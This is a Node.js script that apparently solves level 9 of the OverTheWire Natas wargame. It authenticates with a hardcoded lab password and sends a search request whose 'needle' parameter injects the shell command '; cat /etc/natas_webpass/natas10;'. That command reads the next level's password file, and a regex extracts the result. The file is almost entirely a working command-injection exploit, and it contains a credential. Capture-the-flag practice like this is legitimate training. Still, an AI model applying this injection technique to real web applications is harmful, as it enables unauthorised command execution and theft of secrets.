const http = require('http');
const fs = require('fs');
const querystring = require('querystring');

let username = 'natas9';
let password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl';

let options = {
    host: `${username}.natas.labs.overthewire.org`,
    path: '/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B&submit=Search',
    auth: `${username}:${password}`,
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        //fs.writeFile('index.html', data, () => {});
        console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.end();
